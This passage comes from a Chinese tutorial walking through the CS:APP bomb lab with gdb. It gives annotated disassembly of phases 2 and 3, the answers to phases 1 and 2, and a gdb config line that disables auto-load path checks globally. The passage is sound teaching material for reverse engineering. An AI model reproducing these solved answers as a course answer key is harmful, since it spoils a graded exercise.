</span><span id=__span-19-2><a id=__codelineno-19-2 name=__codelineno-19-2></a>touch<span class=w> </span>.gdbinit
</span><span id=__span-19-3><a id=__codelineno-19-3 name=__codelineno-19-3></a><span class=c1># 创建 .config/gdb 文件夹</span>
</span><span id=__span-19-4><a id=__codelineno-19-4 name=__codelineno-19-4></a>mkdir<span class=w> </span>-p<span class=w> </span>~/.config/gdb
</span><span id=__span-19-5><a id=__codelineno-19-5 name=__codelineno-19-5></a><span class=c1># 允许 gdb 预加载根目录下所有的文件</span>
</span><span id=__span-19-6><a id=__codelineno-19-6 name=__codelineno-19-6></a><span class=nb>echo</span><span class=w> </span><span class=s2>"set auto-load safe-path /"</span><span class=w> </span>&gt;<span class=w> </span>~/.config/gdb/gdbinit
</span></code></pre></div></td></tr></table></div> <p>然后，我们打开工作目录的 <code>.gdbinit</code> 文件，输入如下内容：</p> <div class="language-bash highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-20-1> 1</a></span>
<span class=normal><a href=#__codelineno-20-2> 2</a></span>
<span class=normal><a href=#__codelineno-20-3> 3</a></span>
<span class=normal><a href=#__codelineno-20-4> 4</a></span>
<span class=normal><a href=#__codelineno-20-5> 5</a></span>
<span class=normal><a href=#__codelineno-20-6> 6</a></span>
<span class=normal><a href=#__codelineno-20-7> 7</a></span>
<span class=normal><a href=#__codelineno-20-8> 8</a></span>
<span class=normal><a href=#__codelineno-20-9> 9</a></span>
<span class=normal><a href=#__codelineno-20-10>10</a></span>
<span class=normal><a href=#__codelineno-20-11>11</a></span>
<span class=normal><a href=#__codelineno-20-12>12</a></span>
<span class=normal><a href=#__codelineno-20-13>13</a></span>
<span class=normal><a href=#__codelineno-20-14>14</a></span>
<span class=normal><a href=#__codelineno-20-15>15</a></span>
<span class=normal><a href=#__codelineno-20-16>16</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-20-1><a id=__codelineno-20-1 name=__codelineno-20-1></a><span class=c1># ./gdbinit</span>
</span><span id=__span-20-2><a id=__codelineno-20-2 name=__codelineno-20-2></a><span class=c1># 设置默认文件输入，这样我们不必每次手动输入答案</span>
</span><span id=__span-20-3><a id=__codelineno-20-3 name=__codelineno-20-3></a><span class=nb>set</span><span class=w> </span>args<span class=w> </span>sol.txt
</span><span id=__span-20-4><a id=__codelineno-20-4 name=__codelineno-20-4></a>
</span><span id=__span-20-5><a id=__codelineno-20-5 name=__codelineno-20-5></a><span class=c1># 为各个 phase 函数设置断点，用以观察其执行过程</span>
</span><span id=__span-20-6><a id=__codelineno-20-6 name=__codelineno-20-6></a><span class=c1># 如果做完了某个 phase，可以将其注释掉，这样就不会再进入该 phase 了</span>
</span><span id=__span-20-7><a id=__codelineno-20-7 name=__codelineno-20-7></a><span class=nb>set</span><span class=w> </span>pag<span class=w> </span>off
</span><span id=__span-20-8><a id=__codelineno-20-8 name=__codelineno-20-8></a>b<span class=w> </span>explode_bomb
</span><span id=__span-20-9><a id=__codelineno-20-9 name=__codelineno-20-9></a>b<span class=w> </span>phase_1
</span><span id=__span-20-10><a id=__codelineno-20-10 name=__codelineno-20-10></a>b<span class=w> </span>phase_2
</span><span id=__span-20-11><a id=__codelineno-20-11 name=__codelineno-20-11></a>b<span class=w> </span>phase_3
</span><span id=__span-20-12><a id=__codelineno-20-12 name=__codelineno-20-12></a>b<span class=w> </span>phase_4
</span><span id=__span-20-13><a id=__codelineno-20-13 name=__codelineno-20-13></a>b<span class=w> </span>phase_5
</span><span id=__span-20-14><a id=__codelineno-20-14 name=__codelineno-20-14></a>b<span class=w> </span>phase_6
</span><span id=__span-20-15><a id=__codelineno-20-15 name=__codelineno-20-15></a>
</span><span id=__span-20-16><a id=__codelineno-20-16 name=__codelineno-20-16></a>r
</span></code></pre></div></td></tr></table></div> <p>此时 sol.txt 里的内容如下：(注意结尾要有换行)</p> <div class="language-text highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-21-1>1</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-21-1><a id=__codelineno-21-1 name=__codelineno-21-1></a>Border relations with Canada have never been better.
</span></code></pre></div></td></tr></table></div> <p>此外，不用 <code>disas</code> 了话也可以用 <code>layout asm</code> 来开启视图，方便分析。关闭 layout 的方式为，按下 <code>Ctrl + x</code>，然后再按下 <code>a</code>。</p> </li> <li> <h3 id=phase-2>Phase 2<a class=headerlink href=#phase-2 title="Permanent link">¶</a></h3> <p>这一次在 <code>phase_2</code> 的地方输入 <code>abcd</code>：</p> <div class="language-bash highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-22-1> 1</a></span>
<span class=normal><a href=#__codelineno-22-2> 2</a></span>
<span class=normal><a href=#__codelineno-22-3> 3</a></span>
<span class=normal><a href=#__codelineno-22-4> 4</a></span>
<span class=normal><a href=#__codelineno-22-5> 5</a></span>
<span class=normal><a href=#__codelineno-22-6> 6</a></span>
<span class=normal><a href=#__codelineno-22-7> 7</a></span>
<span class=normal><a href=#__codelineno-22-8> 8</a></span>
<span class=normal><a href=#__codelineno-22-9> 9</a></span>
<span class=normal><a href=#__codelineno-22-10>10</a></span>
<span class=normal><a href=#__codelineno-22-11>11</a></span>
<span class=normal><a href=#__codelineno-22-12>12</a></span>
<span class=normal><a href=#__codelineno-22-13>13</a></span>
<span class=normal><a href=#__codelineno-22-14>14</a></span>
<span class=normal><a href=#__codelineno-22-15>15</a></span>
<span class=normal><a href=#__codelineno-22-16>16</a></span>
<span class=normal><a href=#__codelineno-22-17>17</a></span>
<span class=normal><a href=#__codelineno-22-18>18</a></span>
<span class=normal><a href=#__codelineno-22-19>19</a></span>
<span class=normal><a href=#__codelineno-22-20>20</a></span>
<span class=normal><a href=#__codelineno-22-21>21</a></span>
<span class=normal><a href=#__codelineno-22-22>22</a></span>
<span class=normal><a href=#__codelineno-22-23>23</a></span>
<span class=normal><a href=#__codelineno-22-24>24</a></span>
<span class=normal><a href=#__codelineno-22-25>25</a></span>
<span class=normal><a href=#__codelineno-22-26>26</a></span>
<span class=normal><a href=#__codelineno-22-27>27</a></span>
<span class=normal><a href=#__codelineno-22-28>28</a></span>
<span class=normal><a href=#__codelineno-22-29>29</a></span>
<span class=normal><a href=#__codelineno-22-30>30</a></span>
<span class=normal><a href=#__codelineno-22-31>31</a></span>
<span class=normal><a href=#__codelineno-22-32>32</a></span>
<span class=normal><a href=#__codelineno-22-33>33</a></span>
<span class=normal><a href=#__codelineno-22-34>34</a></span>
<span class=normal><a href=#__codelineno-22-35>35</a></span>
<span class=normal><a href=#__codelineno-22-36>36</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-22-1><a id=__codelineno-22-1 name=__codelineno-22-1></a>Linux$<span class=w> </span>gdb<span class=w> </span>bomb
</span><span id=__span-22-2><a id=__codelineno-22-2 name=__codelineno-22-2></a>Welcome<span class=w> </span>to<span class=w> </span>my<span class=w> </span>fiendish<span class=w> </span>little<span class=w> </span>bomb.<span class=w> </span>You<span class=w> </span>have<span class=w> </span><span class=m>6</span><span class=w> </span>phases<span class=w> </span>with
</span><span id=__span-22-3><a id=__codelineno-22-3 name=__codelineno-22-3></a>which<span class=w> </span>to<span class=w> </span>blow<span class=w> </span>yourself<span class=w> </span>up.<span class=w> </span>Have<span class=w> </span>a<span class=w> </span>nice<span class=w> </span>day!
</span><span id=__span-22-4><a id=__codelineno-22-4 name=__codelineno-22-4></a>Phase<span class=w> </span><span class=m>1</span><span class=w> </span>defused.<span class=w> </span>How<span class=w> </span>about<span class=w> </span>the<span class=w> </span>next<span class=w> </span>one?
</span><span id=__span-22-5><a id=__codelineno-22-5 name=__codelineno-22-5></a>abcd
</span><span id=__span-22-6><a id=__codelineno-22-6 name=__codelineno-22-6></a>
</span><span id=__span-22-7><a id=__codelineno-22-7 name=__codelineno-22-7></a>Breakpoint<span class=w> </span><span class=m>2</span>,<span class=w> </span>0x0000000000400efc<span class=w> </span><span class=k>in</span><span class=w> </span>phase_2<span class=w> </span><span class=o>()</span>
</span><span id=__span-22-8><a id=__codelineno-22-8 name=__codelineno-22-8></a><span class=o>(</span>gdb<span class=o>)</span><span class=w> </span>disas
</span><span id=__span-22-9><a id=__codelineno-22-9 name=__codelineno-22-9></a>Dump<span class=w> </span>of<span class=w> </span>assembler<span class=w> </span>code<span class=w> </span><span class=k>for</span><span class=w> </span><span class=k>function</span><span class=w> </span>phase_2:
</span><span id=__span-22-10><a id=__codelineno-22-10 name=__codelineno-22-10></a><span class=o>=</span>&gt;<span class=w> </span>0x0000000000400efc<span class=w> </span>&lt;+0&gt;:<span class=w>     </span>push<span class=w>   </span>%rbp<span class=w>     </span><span class=c1># 保存调用者的%rbp寄存器</span>
</span><span id=__span-22-11><a id=__codelineno-22-11 name=__codelineno-22-11></a>0x0000000000400efd<span class=w> </span>&lt;+1&gt;:<span class=w>     </span>push<span class=w>   </span>%rbx<span class=w>        </span><span class=c1># 保存调用者的%rbx寄存器</span>
</span><span id=__span-22-12><a id=__codelineno-22-12 name=__codelineno-22-12></a>0x0000000000400efe<span class=w> </span>&lt;+2&gt;:<span class=w>     </span>sub<span class=w>    </span><span class=nv>$0</span>x28,%rsp<span class=w>  </span><span class=c1># 在栈上分配40字节空间</span>
</span><span id=__span-22-13><a id=__codelineno-22-13 name=__codelineno-22-13></a>0x0000000000400f02<span class=w> </span>&lt;+6&gt;:<span class=w>     </span>mov<span class=w>    </span>%rsp,%rsi<span class=w>   </span><span class=c1># 把当前栈顶地址传给 read_six_numbers 函数，用于存储输入的6个整数, 有可能的形式是void read_six_numbers(int file_descriptor, int* buffer)</span>
</span><span id=__span-22-14><a id=__codelineno-22-14 name=__codelineno-22-14></a>0x0000000000400f05<span class=w> </span>&lt;+9&gt;:<span class=w>     </span>call<span class=w>   </span>0x40145c<span class=w> </span>&lt;read_six_numbers&gt;<span class=w> </span><span class=c1># 把六个 32 位整数写入从 %rsp 开始的内存</span>
</span><span id=__span-22-15><a id=__codelineno-22-15 name=__codelineno-22-15></a>0x0000000000400f0a<span class=w> </span>&lt;+14&gt;:<span class=w>    </span>cmpl<span class=w>   </span><span class=nv>$0</span>x1,<span class=o>(</span>%rsp<span class=o>)</span><span class=w> </span><span class=c1># 检查第一个数字是否为1</span>
</span><span id=__span-22-16><a id=__codelineno-22-16 name=__codelineno-22-16></a>0x0000000000400f0e<span class=w> </span>&lt;+18&gt;:<span class=w>    </span>je<span class=w>     </span>0x400f30<span class=w> </span>&lt;phase_2+52&gt;<span class=w>   </span><span class=c1># 如果是1，跳转到设置循环的代码</span>
</span><span id=__span-22-17><a id=__codelineno-22-17 name=__codelineno-22-17></a>0x0000000000400f10<span class=w> </span>&lt;+20&gt;:<span class=w>    </span>call<span class=w>   </span>0x40143a<span class=w> </span>&lt;explode_bomb&gt;<span class=w> </span><span class=c1># 否则引爆炸弹</span>
</span><span id=__span-22-18><a id=__codelineno-22-18 name=__codelineno-22-18></a>0x0000000000400f15<span class=w> </span>&lt;+25&gt;:<span class=w>    </span>jmp<span class=w>    </span>0x400f30<span class=w> </span>&lt;phase_2+52&gt;<span class=w>   </span><span class=c1>#（永远不会执行到这里） </span>
</span><span id=__span-22-19><a id=__codelineno-22-19 name=__codelineno-22-19></a>0x0000000000400f17<span class=w> </span>&lt;+27&gt;:<span class=w>    </span>mov<span class=w>    </span>-0x4<span class=o>(</span>%rbx<span class=o>)</span>,%eax<span class=w>         </span><span class=c1># === 循环体验证后续数字 ===, eax = 当前数字的前一个数字</span>
</span><span id=__span-22-20><a id=__codelineno-22-20 name=__codelineno-22-20></a>0x0000000000400f1a<span class=w> </span>&lt;+30&gt;:<span class=w>    </span>add<span class=w>    </span>%eax,%eax<span class=w>               </span><span class=c1># eax *= 2</span>
</span><span id=__span-22-21><a id=__codelineno-22-21 name=__codelineno-22-21></a>0x0000000000400f1c<span class=w> </span>&lt;+32&gt;:<span class=w>    </span>cmp<span class=w>    </span>%eax,<span class=o>(</span>%rbx<span class=o>)</span><span class=w>             </span><span class=c1># 比较当前数字与前一个数字的2倍</span>
</span><span id=__span-22-22><a id=__codelineno-22-22 name=__codelineno-22-22></a>0x0000000000400f1e<span class=w> </span>&lt;+34&gt;:<span class=w>    </span>je<span class=w>     </span>0x400f25<span class=w> </span>&lt;phase_2+41&gt;<span class=w>   </span><span class=c1># 如果相等，继续检查</span>
</span><span id=__span-22-23><a id=__codelineno-22-23 name=__codelineno-22-23></a>0x0000000000400f20<span class=w> </span>&lt;+36&gt;:<span class=w>    </span>call<span class=w>   </span>0x40143a<span class=w> </span>&lt;explode_bomb&gt;<span class=w> </span><span class=c1># 否则引爆炸弹</span>
</span><span id=__span-22-24><a id=__codelineno-22-24 name=__codelineno-22-24></a>0x0000000000400f25<span class=w> </span>&lt;+41&gt;:<span class=w>    </span>add<span class=w>    </span><span class=nv>$0</span>x4,%rbx<span class=w>               </span><span class=c1># rbx指向下一个数字</span>
</span><span id=__span-22-25><a id=__codelineno-22-25 name=__codelineno-22-25></a>0x0000000000400f29<span class=w> </span>&lt;+45&gt;:<span class=w>    </span>cmp<span class=w>    </span>%rbp,%rbx<span class=w>               </span><span class=c1># 检查是否遍历完所有6个数字</span>
</span><span id=__span-22-26><a id=__codelineno-22-26 name=__codelineno-22-26></a>0x0000000000400f2c<span class=w> </span>&lt;+48&gt;:<span class=w>    </span>jne<span class=w>    </span>0x400f17<span class=w> </span>&lt;phase_2+27&gt;<span class=w>   </span><span class=c1># 如果没遍历完，继续循环</span>
</span><span id=__span-22-27><a id=__codelineno-22-27 name=__codelineno-22-27></a>0x0000000000400f2e<span class=w> </span>&lt;+50&gt;:<span class=w>    </span>jmp<span class=w>    </span>0x400f3c<span class=w> </span>&lt;phase_2+64&gt;<span class=w>   </span><span class=c1># 跳转到函数收尾部分</span>
</span><span id=__span-22-28><a id=__codelineno-22-28 name=__codelineno-22-28></a>0x0000000000400f30<span class=w> </span>&lt;+52&gt;:<span class=w>    </span>lea<span class=w>    </span>0x4<span class=o>(</span>%rsp<span class=o>)</span>,%rbx<span class=w>        </span><span class=c1># === 设置循环参数 ===, rbx指向第二个数字</span>
</span><span id=__span-22-29><a id=__codelineno-22-29 name=__codelineno-22-29></a>0x0000000000400f35<span class=w> </span>&lt;+57&gt;:<span class=w>    </span>lea<span class=w>    </span>0x18<span class=o>(</span>%rsp<span class=o>)</span>,%rbp<span class=w>       </span><span class=c1># rbp指向栈上第7个位置（循环结束条件）</span>
</span><span id=__span-22-30><a id=__codelineno-22-30 name=__codelineno-22-30></a>0x0000000000400f3a<span class=w> </span>&lt;+62&gt;:<span class=w>    </span>jmp<span class=w>    </span>0x400f17<span class=w> </span>&lt;phase_2+27&gt;<span class=w> </span><span class=c1># 跳转到循环体</span>
</span><span id=__span-22-31><a id=__codelineno-22-31 name=__codelineno-22-31></a>0x0000000000400f3c<span class=w> </span>&lt;+64&gt;:<span class=w>    </span>add<span class=w>    </span><span class=nv>$0</span>x28,%rsp<span class=w>  </span><span class=c1># === 函数返回===, 释放栈空间</span>
</span><span id=__span-22-32><a id=__codelineno-22-32 name=__codelineno-22-32></a>0x0000000000400f40<span class=w> </span>&lt;+68&gt;:<span class=w>    </span>pop<span class=w>    </span>%rbx<span class=w>        </span><span class=c1># 恢复rbx寄存器</span>
</span><span id=__span-22-33><a id=__codelineno-22-33 name=__codelineno-22-33></a>0x0000000000400f41<span class=w> </span>&lt;+69&gt;:<span class=w>    </span>pop<span class=w>    </span>%rbp<span class=w>        </span><span class=c1># 恢复rbp寄存器</span>
</span><span id=__span-22-34><a id=__codelineno-22-34 name=__codelineno-22-34></a>0x0000000000400f42<span class=w> </span>&lt;+70&gt;:<span class=w>    </span>ret<span class=w>                </span><span class=c1># 返回调用者</span>
</span><span id=__span-22-35><a id=__codelineno-22-35 name=__codelineno-22-35></a>End<span class=w> </span>of<span class=w> </span>assembler<span class=w> </span>dump.
</span><span id=__span-22-36><a id=__codelineno-22-36 name=__codelineno-22-36></a><span class=o>(</span>gdb<span class=o>)</span><span class=w> </span>
</span></code></pre></div></td></tr></table></div> <p>从函数名可以得知，这一次要读入六个数字 <code>read_six_numbers</code>。从 <code>cmpl $0x1,(%rsp)</code> 看出第一个数字一定是 1，然后跳转到 +52 的位置，具体看上述注释。根据分析，这个 <code>phase_2</code> 函数要求用户输入6个整数，满足以下条件：</p> <ul> <li>第一个数字必须是1</li> <li>后续每个数字必须是前一个数字的2倍</li> </ul> <p>因此，正确的输入序列应该是：1 2 4 8 16 32。</p> <p><img alt="alt text" src=../../img/image-89.png width=200></p> </li> <li> <h3 id=phase-3>Phase 3<a class=headerlink href=#phase-3 title="Permanent link">¶</a></h3> <div class="language-bash highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-23-1> 1</a></span>
<span class=normal><a href=#__codelineno-23-2> 2</a></span>
<span class=normal><a href=#__codelineno-23-3> 3</a></span>
<span class=normal><a href=#__codelineno-23-4> 4</a></span>
<span class=normal><a href=#__codelineno-23-5> 5</a></span>
<span class=normal><a href=#__codelineno-23-6> 6</a></span>
<span class=normal><a href=#__codelineno-23-7> 7</a></span>
<span class=normal><a href=#__codelineno-23-8> 8</a></span>
<span class=normal><a href=#__codelineno-23-9> 9</a></span>
<span class=normal><a href=#__codelineno-23-10>10</a></span>
<span class=normal><a href=#__codelineno-23-11>11</a></span>
<span class=normal><a href=#__codelineno-23-12>12</a></span>
<span class=normal><a href=#__codelineno-23-13>13</a></span>
<span class=normal><a href=#__codelineno-23-14>14</a></span>
<span class=normal><a href=#__codelineno-23-15>15</a></span>
<span class=normal><a href=#__codelineno-23-16>16</a></span>
<span class=normal><a href=#__codelineno-23-17>17</a></span>
<span class=normal><a href=#__codelineno-23-18>18</a></span>
<span class=normal><a href=#__codelineno-23-19>19</a></span>
<span class=normal><a href=#__codelineno-23-20>20</a></span>
<span class=normal><a href=#__codelineno-23-21>21</a></span>
<span class=normal><a href=#__codelineno-23-22>22</a></span>
<span class=normal><a href=#__codelineno-23-23>23</a></span>
<span class=normal><a href=#__codelineno-23-24>24</a></span>
<span class=normal><a href=#__codelineno-23-25>25</a></span>
<span class=normal><a href=#__codelineno-23-26>26</a></span>
<span class=normal><a href=#__codelineno-23-27>27</a></span>
<span class=normal><a href=#__codelineno-23-28>28</a></span>
<span class=normal><a href=#__codelineno-23-29>29</a></span>
<span class=normal><a href=#__codelineno-23-30>30</a></span>
<span class=normal><a href=#__codelineno-23-31>31</a></span>
<span class=normal><a href=#__codelineno-23-32>32</a></span>
<span class=normal><a href=#__codelineno-23-33>33</a></span>
<span class=normal><a href=#__codelineno-23-34>34</a></span>
<span class=normal><a href=#__codelineno-23-35>35</a></span>
<span class=normal><a href=#__codelineno-23-36>36</a></span>
<span class=normal><a href=#__codelineno-23-37>37</a></span>
<span class=normal><a href=#__codelineno-23-38>38</a></span>
<span class=normal><a href=#__codelineno-23-39>39</a></span>
<span class=normal><a href=#__codelineno-23-40>40</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-23-1><a id=__codelineno-23-1 name=__codelineno-23-1></a>Breakpoint<span class=w> </span><span class=m>2</span>,<span class=w> </span>0x0000000000400f43<span class=w> </span><span class=k>in</span><span class=w> </span>phase_3<span class=w> </span><span class=o>()</span>
</span><span id=__span-23-2><a id=__codelineno-23-2 name=__codelineno-23-2></a><span class=o>(</span>gdb<span class=o>)</span><span class=w> </span>disas
</span><span id=__span-23-3><a id=__codelineno-23-3 name=__codelineno-23-3></a>Dump<span class=w> </span>of<span class=w> </span>assembler<span class=w> </span>code<span class=w> </span><span class=k>for</span><span class=w> </span><span class=k>function</span><span class=w> </span>phase_3:
</span><span id=__span-23-4><a id=__codelineno-23-4 name=__codelineno-23-4></a><span class=o>=</span>&gt;<span class=w> </span>0x0000000000400f43<span class=w> </span>&lt;+0&gt;:<span class=w>     </span>sub<span class=w>    </span><span class=nv>$0</span>x18,%rsp<span class=w>  </span><span class=c1># 分配24字节的栈空间，用于存储局部变量</span>
</span><span id=__span-23-5><a id=__codelineno-23-5 name=__codelineno-23-5></a>0x0000000000400f47<span class=w> </span>&lt;+4&gt;:<span class=w>     </span>lea<span class=w>    </span>0xc<span class=o>(</span>%rsp<span class=o>)</span>,%rcx<span class=w> </span><span class=c1># 第二个参数地址</span>
</span><span id=__span-23-6><a id=__codelineno-23-6 name=__codelineno-23-6></a>0x0000000000400f4c<span class=w> </span>&lt;+9&gt;:<span class=w>     </span>lea<span class=w>    </span>0x8<span class=o>(</span>%rsp<span class=o>)</span>,%rdx<span class=w> </span><span class=c1># 第一个参数地址</span>
</span><span id=__span-23-7><a id=__codelineno-23-7 name=__codelineno-23-7></a>0x0000000000400f51<span class=w> </span>&lt;+14&gt;:<span class=w>    </span>mov<span class=w>    </span><span class=nv>$0</span>x4025cf,%esi<span class=w> </span><span class=c1># 格式字符串地址, 即"%d %d"</span>
</span><span id=__span-23-8><a id=__codelineno-23-8 name=__codelineno-23-8></a>0x0000000000400f56<span class=w> </span>&lt;+19&gt;:<span class=w>    </span>mov<span class=w>    </span><span class=nv>$0</span>x0,%eax
</span><span id=__span-23-9><a id=__codelineno-23-9 name=__codelineno-23-9></a>0x0000000000400f5b<span class=w> </span>&lt;+24&gt;:<span class=w>    </span>call<span class=w>   </span>0x400bf0<span class=w> </span>&lt;__isoc99_sscanf@plt&gt;<span class=w> </span><span class=c1># 调用sscanf函数解析用户输入，将结果存入栈中指定位置</span>
</span><span id=__span-23-10><a id=__codelineno-23-10 name=__codelineno-23-10></a>0x0000000000400f60<span class=w> </span>&lt;+29&gt;:<span class=w>    </span>cmp<span class=w>    </span><span class=nv>$0</span>x1,%eax<span class=w> </span><span class=c1># 验证sscanf是否成功解析了至少一个整数，否则触发爆炸</span>
</span><span id=__span-23-11><a id=__codelineno-23-11 name=__codelineno-23-11></a>0x0000000000400f63<span class=w> </span>&lt;+32&gt;:<span class=w>    </span>jg<span class=w>     </span>0x400f6a<span class=w> </span>&lt;phase_3+39&gt;
</span><span id=__span-23-12><a id=__codelineno-23-12 name=__codelineno-23-12></a>0x0000000000400f65<span class=w> </span>&lt;+34&gt;:<span class=w>    </span>call<span class=w>   </span>0x40143a<span class=w> </span>&lt;explode_bomb&gt;
</span><span id=__span-23-13><a id=__codelineno-23-13 name=__codelineno-23-13></a>0x0000000000400f6a<span class=w> </span>&lt;+39&gt;:<span class=w>    </span>cmpl<span class=w>   </span><span class=nv>$0</span>x7,0x8<span class=o>(</span>%rsp<span class=o>)</span><span class=w>         </span><span class=c1># == 第一个输入值范围检查 ==, 检查第一个输入值是否&lt;=7</span>
</span><span id=__span-23-14><a id=__codelineno-23-14 name=__codelineno-23-14></a>0x0000000000400f6f<span class=w> </span>&lt;+44&gt;:<span class=w>    </span>ja<span class=w>     </span>0x400fad<span class=w> </span>&lt;phase_3+106&gt;<span class=w> </span><span class=c1># 大于7则爆炸</span>
</span><span id=__span-23-15><a id=__codelineno-23-15 name=__codelineno-23-15></a>0x0000000000400f71<span class=w> </span>&lt;+46&gt;:<span class=w>    </span>mov<span class=w>    </span>0x8<span class=o>(</span>%rsp<span class=o>)</span>,%eax<span class=w>         </span><span class=c1># 加载第一个输入值</span>
</span><span id=__span-23-16><a id=__codelineno-23-16 name=__codelineno-23-16></a>0x0000000000400f75<span class=w> </span>&lt;+50&gt;:<span class=w>    </span>jmp<span class=w>    </span>*0x402470<span class=o>(</span>,%rax,8<span class=o>)</span><span class=w>     </span><span class=c1># 根据输入值进行跳转表查找，常见于switch-case语句的汇编实现</span>
</span><span id=__span-23-17><a id=__codelineno-23-17 name=__codelineno-23-17></a>0x0000000000400f7c<span class=w> </span>&lt;+57&gt;:<span class=w>    </span>mov<span class=w>    </span><span class=nv>$0</span>xcf,%eax<span class=w>             </span><span class=c1># 每个分支都设置一个特定的整数值到eax寄存器</span>
</span><span id=__span-23-18><a id=__codelineno-23-18 name=__codelineno-23-18></a>0x0000000000400f81<span class=w> </span>&lt;+62&gt;:<span class=w>    </span>jmp<span class=w>    </span>0x400fbe<span class=w> </span>&lt;phase_3+123&gt;
</span><span id=__span-23-19><a id=__codelineno-23-19 name=__codelineno-23-19></a>0x0000000000400f83<span class=w> </span>&lt;+64&gt;:<span class=w>    </span>mov<span class=w>    </span><span class=nv>$0</span>x2c3,%eax
</span><span id=__span-23-20><a id=__codelineno-23-20 name=__codelineno-23-20></a>0x0000000000400f88<span class=w> </span>&lt;+69&gt;:<span class=w>    </span>jmp<span class=w>    </span>0x400fbe<span class=w> </span>&lt;phase_3+123&gt;
</span><span id=__span-23-21><a id=__codelineno-23-21 name=__codelineno-23-21></a>0x0000000000400f8a<span class=w> </span>&lt;+71&gt;:<span class=w>    </span>mov<span class=w>    </span><span class=nv>$0</span>x100,%eax
</span><span id=__span-23-22><a id=__codelineno-23-22 name=__codelineno-23-22></a>0x0000000000400f8f<span class=w> </span>&lt;+76&gt;:<span class=w>    </span>jmp<span class=w>    </span>0x400fbe<span class=w> </span>&lt;phase_3+123&gt;
</span><span id=__span-23-23><a id=__codelineno-23-23 name=__codelineno-23-23></a>0x0000000000400f91<span class=w> </span>&lt;+78&gt;:<span class=w>    </span>mov<span class=w>    </span><span class=nv>$0</span>x185,%eax
</span><span id=__span-23-24><a id=__codelineno-23-24 name=__codelineno-23-24></a>0x0000000000400f96<span class=w> </span>&lt;+83&gt;:<span class=w>    </span>jmp<span class=w>    </span>0x400fbe<span class=w> </span>&lt;phase_3+123&gt;
</span><span id=__span-23-25><a id=__codelineno-23-25 name=__codelineno-23-25></a>0x0000000000400f98<span class=w> </span>&lt;+85&gt;:<span class=w>    </span>mov<span class=w>    </span><span class=nv>$0</span>xce,%eax
</span><span id=__span-23-26><a id=__codelineno-23-26 name=__codelineno-23-26></a>0x0000000000400f9d<span class=w> </span>&lt;+90&gt;:<span class=w>    </span>jmp<span class=w>    </span>0x400fbe<span class=w> </span>&lt;phase_3+123&gt;
</span><span id=__span-23-27><a id=__codelineno-23-27 name=__codelineno-23-27></a>0x0000000000400f9f<span class=w> </span>&lt;+92&gt;:<span class=w>    </span>mov<span class=w>    </span><span class=nv>$0</span>x2aa,%eax
</span><span id=__span-23-28><a id=__codelineno-23-28 name=__codelineno-23-28></a>0x0000000000400fa4<span class=w> </span>&lt;+97&gt;:<span class=w>    </span>jmp<span class=w>    </span>0x400fbe<span class=w> </span>&lt;phase_3+123&gt;
</span><span id=__span-23-29><a id=__codelineno-23-29 name=__codelineno-23-29></a>0x0000000000400fa6<span class=w> </span>&lt;+99&gt;:<span class=w>    </span>mov<span class=w>    </span><span class=nv>$0</span>x147,%eax
</span><span id=__span-23-30><a id=__codelineno-23-30 name=__codelineno-23-30></a>0x0000000000400fab<span class=w> </span>&lt;+104&gt;:<span class=w>   </span>jmp<span class=w>    </span>0x400fbe<span class=w> </span>&lt;phase_3+123&gt;
</span><span id=__span-23-31><a id=__codelineno-23-31 name=__codelineno-23-31></a>0x0000000000400fad<span class=w> </span>&lt;+106&gt;:<span class=w>   </span>call<span class=w>   </span>0x40143a<span class=w> </span>&lt;explode_bomb&gt;
</span><span id=__span-23-32><a id=__codelineno-23-32 name=__codelineno-23-32></a>0x0000000000400fb2<span class=w> </span>&lt;+111&gt;:<span class=w>   </span>mov<span class=w>    </span><span class=nv>$0</span>x0,%eax
</span><span id=__span-23-33><a id=__codelineno-23-33 name=__codelineno-23-33></a>0x0000000000400fb7<span class=w> </span>&lt;+116&gt;:<span class=w>   </span>jmp<span class=w>    </span>0x400fbe<span class=w> </span>&lt;phase_3+123&gt;
</span><span id=__span-23-34><a id=__codelineno-23-34 name=__codelineno-23-34></a>0x0000000000400fb9<span class=w> </span>&lt;+118&gt;:<span class=w>   </span>mov<span class=w>    </span><span class=nv>$0</span>x137,%eax
</span><span id=__span-23-35><a id=__codelineno-23-35 name=__codelineno-23-35></a>0x0000000000400fbe<span class=w> </span>&lt;+123&gt;:<span class=w>   </span>cmp<span class=w>    </span>0xc<span class=o>(</span>%rsp<span class=o>)</span>,%eax<span class=w>          </span><span class=c1># 比较用户输入的第二个整数是否等于根据第一个输入值确定的预期值</span>
</span><span id=__span-23-36><a id=__codelineno-23-36 name=__codelineno-23-36></a>0x0000000000400fc2<span class=w> </span>&lt;+127&gt;:<span class=w>   </span>je<span class=w>     </span>0x400fc9<span class=w> </span>&lt;phase_3+134&gt;<span class=w>  </span><span class=c1># 相等则通过</span>
</span><span id=__span-23-37><a id=__codelineno-23-37 name=__codelineno-23-37></a>0x0000000000400fc4<span class=w> </span>&lt;+129&gt;:<span class=w>   </span>call<span class=w>   </span>0x40143a<span class=w> </span>&lt;explode_bomb&gt;
</span><span id=__span-23-38><a id=__codelineno-23-38 name=__codelineno-23-38></a>0x0000000000400fc9<span class=w> </span>&lt;+134&gt;:<span class=w>   </span>add<span class=w>    </span><span class=nv>$0</span>x18,%rsp<span class=w> </span><span class=c1># 恢复栈指针</span>
</span><span id=__span-23-39><a id=__codelineno-23-39 name=__codelineno-23-39></a>0x0000000000400fcd<span class=w> </span>&lt;+138&gt;:<span class=w>   </span>ret<span class=w>               </span><span class=c1># 返回</span>
</span><span id=__span-23-40><a id=__codelineno-23-40 name=__codelineno-23-40></a>End<span class=w> </span>of<span class=w> </span>assembler<span class=w> </span>dump.
</span></code></pre></div></td></tr></table></div> <p>由此可知这一关需要输入两个数字：</p> <div class="language-bash highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-24-1>1</a></span>
